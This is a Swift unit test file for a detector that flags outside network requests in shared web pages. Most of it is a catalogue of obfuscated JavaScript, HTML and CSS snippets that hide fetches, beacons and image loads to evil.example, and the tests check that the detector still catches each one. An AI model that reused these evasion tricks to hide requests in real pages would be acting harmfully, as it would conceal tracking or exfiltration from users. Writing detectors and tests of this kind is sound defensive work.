import XCTest
@testable import Lamp

/// A shared page is said to connect outside itself only where one of its requests goes to an outside address, read from
/// its code: The Little House reads only its own files and links to its credits, Home HQ asks Open-Meteo for the
/// weather, and an address the code builds as it runs is never taken for the app's own.
final class WebReachTests: XCTestCase {
    private func labels(_ files: [(String, String)], data: [(String, Data)] = []) throws -> [String] {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("lamp-reach-\(UUID().uuidString)")
        addTeardownBlock { try? FileManager.default.removeItem(at: folder) }
        var sources: [URL] = [], models: [URL] = []
        for (name, text) in files {
            let url = folder.appendingPathComponent(name)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try text.write(to: url, atomically: true, encoding: .utf8)
            sources.append(url)
        }
        for (name, bytes) in data {
            let url = folder.appendingPathComponent(name)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try bytes.write(to: url)
            models.append(url)
        }
        return TVFiles.detected(in: sources, data: models).map(\.label)
    }

    /// A starter's page as a shared file carries it: Web/ without Lamp's lamp.js and three.js.
    private func page(_ starter: String) throws -> (code: [(String, String)], data: [(String, Data)]) {
        let web = try StarterTrees.tree(starter).appendingPathComponent("Web")
        var code: [(String, String)] = [], data: [(String, Data)] = []
        for path in try FileManager.default.subpathsOfDirectory(atPath: web.path).sorted()
        where !TVTemplate.isLamps("Web/" + path) {
            let url = web.appendingPathComponent(path)
            guard (try? url.resourceValues(forKeys: [.isRegularFileKey]))?.isRegularFile == true else { continue }
            if TVFiles.codeExtensions.contains(url.pathExtension.lowercased()) {
                code.append((path, try String(contentsOf: url, encoding: .utf8)))
            } else {
                data.append((path, try Data(contentsOf: url)))
            }
        }
        return (code, data)
    }

    func testTheLittleHouseReachesOnlyItsOwnFilesAndLinksToItsCredits() throws {
        let house = try page("thelittlehouse")
        XCTAssertTrue(house.data.contains { $0.0.hasSuffix(".glb") }, "its models are read for the files they name")
        let reach = WebReach.analyze(code: house.code, data: house.data)
        XCTAssertEqual(reach.hosts, [])
        XCTAssertFalse(reach.unnamed)
        XCTAssertFalse(reach.unknown, "\(reach.why)")
        XCTAssertTrue(reach.links)
        let said = try labels(house.code, data: house.data)
        XCTAssertFalse(said.contains { $0.hasPrefix("Connects") || $0 == "May connect outside this app" }, "\(said)")
        XCTAssertTrue(said.contains("Opens websites when clicked"), "\(said)")
    }

    func testHomeHQNamesOpenMeteo() throws {
        let home = try page("homehq")
        let live = try XCTUnwrap(home.code.first { $0.0 == "js/live.js" })
        XCTAssertEqual(WebReach.analyze(code: [live]).hosts, ["geocoding-api.open-meteo.com", "api.open-meteo.com"])
        let said = try labels(home.code, data: home.data)
        XCTAssertTrue(said.contains { $0.hasPrefix("Connects to ") && $0.contains("open-meteo.com") }, "\(said)")
    }

    /// Addresses built as the page runs, or given to Lamp's blocks, are outside or unknown, never the app's own.
    func testAnAddressItCantFollowIsNeverTheAppsOwn() {
        func reach(_ script: String, html: String? = nil) -> WebReach.Result {
            WebReach.analyze(code: [("app.js", script)] + (html.map { [("index.html", $0)] } ?? []))
        }
        func unknown(_ script: String, _ line: UInt = #line) {
            let found = reach(script)
            XCTAssertTrue(found.unknown || found.connects, "taken for the app's own: \(script)", line: line)
            XCTAssertTrue(found.hosts.isEmpty, "\(found.hosts)", line: line)
        }
        func outside(_ script: String, _ host: String, _ line: UInt = #line) {
            XCTAssertTrue(reach(script).hosts.contains(host), "\(reach(script)) for \(script)", line: line)
        }
        func own(_ script: String, _ line: UInt = #line) {
            let found = reach(script)
            XCTAssertFalse(found.unknown || found.connects, "\(found.why) for \(script)", line: line)
        }

        unknown("var base = document.querySelector('input').value; fetch(base + '/v1/data');")
        unknown("fetch(location.hash.slice(1));")
        unknown("fetch(LampAssets.url(field.value));")
        unknown("fetch('/' + path);")                                  // '//elsewhere.example/…'
        unknown("fetch('ht' + suffix);")
        unknown("function get(u) { return fetch(u); }\nget('sounds/rain.ogg');")
        unknown("var xhr = new XMLHttpRequest(); xhr.open(method, target);")
        unknown("var u = 'https://elsewhere.example/x'; window['fe' + 'tch'](u);")
        unknown("LampAssets = { url: function (s) { return s; } }; fetch(LampAssets.url('a.json'));")
        unknown("new WebSocket(server);")
        unknown("node.setAttribute(name, value);")
        unknown("list.innerHTML = '<img src=\"' + picture + '\">';")

        outside("fetch(LampAssets.url('https://elsewhere.example/a.json'));", "elsewhere.example")
        outside("var host = 'https://' + 'elsewhere.example'; fetch(host + '/v1');", "elsewhere.example")
        outside("const api = `https://api.elsewhere.example/v1/${id}`;\nfetch(api);", "api.elsewhere.example")
        outside("fetch(new URL('data.json', 'https://cdn.elsewhere.example/'));", "cdn.elsewhere.example")
        outside("new Image().src = 'https://pixel.elsewhere.example/p.gif';", "pixel.elsewhere.example")
        outside("list.innerHTML = '<img src=\"https://pixel.elsewhere.example/p.gif\">';", "pixel.elsewhere.example")
        outside("document.body.style.backgroundImage = 'url(https://img.elsewhere.example/b.png)';", "img.elsewhere.example")
        outside("var P = 'https://pixel.elsewhere.example/p.gif'; list.innerHTML = '<img src=\"' + P + '\">';", "pixel.elsewhere.example")
        outside("navigator.sendBeacon('https://log.elsewhere.example/hit', data);", "log.elsewhere.example")
        XCTAssertTrue(reach("", html: "<link rel=\"stylesheet\" href=\"https://fonts.elsewhere.example/css\">").hosts.contains("fonts.elsewhere.example"))
        XCTAssertTrue(reach("import { x } from 'https://cdn.elsewhere.example/lib.js';").remoteCode)

        own("fetch('levels.json');")
        own("fetch(LampAssets.url('sounds/' + sound.file));")
        own("var request = new XMLHttpRequest(); request.open('GET', LampAssets.url('sounds/' + name));")
        own("fetch(new URL('data.json', location.href));")
        own("const t = new THREE.TextureLoader(); t.load(`textures/${name}.png`);")
        let credit = reach("var UP = 'https://github.com/someone/thing'; box.innerHTML = '<p>Based on <a href=\"' + UP + '\">thing</a></p>';")
        XCTAssertTrue(credit.links && !credit.unknown && !credit.connects, "\(credit)")
        XCTAssertFalse(reach("", html: "<a href=\"https://kenney.nl\">Kenney</a>").connects)
        XCTAssertTrue(reach("", html: "<a href=\"https://kenney.nl\">Kenney</a>").links)
    }

    /// Pages written to hide a request: each must still say it connects, or may.
    func testAPageWrittenToHideARequestStillSaysItMayConnect() {
        let evil = "'ht' + 'tps://evil.example/x'"
        let scripts = [
            "if (1) /\"/.test(''); fetch('https://evil.example/x'); // \"",
            "fetch(\"\\x01https://evil.example/x\");",
            "fetch(\"/\\\\evil.example/x\");",
            "fetch(\"/\\t/evil.example/x\");",
            "fetch(\"ht\\ntps://evil.example/x\");",
            "fetch(location.origin + '@evil.example/x');",
            "const u = new URL('./x.json', location.href); u.hostname = 'evil.example'; fetch(u);",
            "location.host = 'evil.example';",
            "const cfg = { url: './a.json' }; const o = JSON.parse(text); fetch(o.url);",
            "let url = './a.json'; [url] = [\(evil)]; fetch(url);",
            "var url = './a.json'; window.url = \(evil); fetch(url);",
            "function el(tag, attrs) { var node = document.createElement(tag); for (var key in attrs) node.setAttribute(key, key == 'src' ? \(evil) : attrs[key]); return node; }\nel('img', { alt: 'x' });",
            "function el(tag, attrs) { var node = document.createElement(tag); for (var key in attrs) node.setAttribute(key, attrs[key]); return node; }\nvar src = \(evil); el('img', { src });",
            "window.LampAssets = { text: fetch }; LampAssets.text('x');",
            "Object.assign(LampAssets, { text: fetch }); LampAssets.text('x');",
            "const f = fetch; f(\(evil));",
            "\\u0066etch(\(evil));",
            "img.setAttributeNS(null, 'href', \(evil));",
            "document.body.style.backgroundImage = 'url' + '(//evil.example/x.png)';",
            "const L = THREE.FileLoader; new L().load(\(evil));",
            "x.open(m(), \(evil));",
            "a.ping = \(evil); a.click();",
            "context.audioWorklet.addModule(\(evil));",
            "location['href'] = \(evil);",
            "list.innerHTML = '<img src=' + u + '>';",
            "list.innerHTML = '<img ' + 'src=\"' + u + '\">';",
            "new RTCPeerConnection({ iceServers: [{ urls: 'stun:evil.example:3478' }] });",
            "import('data:text/javascript,fetch(\"https://evil.example/x\")');",
            "s.src = 'data:text/javascript,fetch(1)';",
            "Reflect.construct(WebSocket, [\(evil)]);",
            "fetch.call(null, \(evil));",
            "fetch?.(\(evil));",
            "globalThis['fe' + 'tch'](\(evil));",
        ]
        for script in scripts {
            let found = WebReach.analyze(code: [("app.js", script)])
            XCTAssertTrue(found.unknown || found.connects, "hidden: \(script)")
        }
        let pages = [
            "<script type=\"text/ecmascript\">fetch('https://evil.example/x')</script>",
            "<script type=\" module \">fetch('https://evil.example/x')</script>",
            "<script type=\"module\" type=\"text/plain\">fetch('https://evil.example/x')</script>",
            "<img src=\"https://evil.example/x.png\" src=\"./a.png\">",
            "<!--><img src=\"https://evil.example/x.png\"><!---->",
            "<script><!--\n// <script></script>\nfetch('https://evil.example/x')\n//--></script>",
            "<iframe srcdoc=\"<img src='https://evil.example/x.png'>\"></iframe>",
            "<iframe src=\"data:text/html,<img src=https://evil.example/x.png>\"></iframe>",
            "<script type=\"importmap\">{ \"imports\": { \"a\": 1 }, \"scopes\": { \"/\": { \"three\": \"https://evil.example/three.js\" } } }</script><script type=\"module\">import 'three';</script>",
            "<img src=\"ht\ntps://evil.example/x.png\">",
            "<img src=\"https&#x3a;//evil.example/x.png\">",
            "<style>.a { background: u\\72l(https://evil.example/x.png) }</style>",
            "<style>@\\69mport 'https://evil.example/x.css';</style>",
            "<style>.a { background: url(\"htt\\70s://evil.example/x.png\") }</style>",
            "<style>.a { content: \"/*\"; background: url(https://evil.example/x.png); content: \"*/\" }</style>",
            "<meta http-equiv=\"refresh\" content=\"0; https://evil.example/\">",
            "<meta http-equiv=\"refresh\" content=\"0; url = https://evil.example/\">",
            "<a href=\"javascript:fetch('https://evil.example/x')\">x</a>",
            "<svg><set attributeName=\"href\" to=\"https://evil.example/x.png\"/></svg>",
        ]
        for page in pages {
            let found = WebReach.analyze(code: [("index.html", page)])
            XCTAssertTrue(found.unknown || found.connects, "hidden: \(page)")
        }
        for (name, text) in [("pic.svg", "<svg><script>fetch('https://evil.example/x')</script></svg>"),
                             ("model.json", "{ \"buffers\": [{ \"uri\": \"https://evil.example/b.bin\" }] }"),
                             ("x.txt", "fetch('https://evil.example/x')")] {
            let found = WebReach.analyze(code: [(name, text)])
            XCTAssertTrue(found.unknown || found.connects, "hidden in \(name)")
        }
    }
}
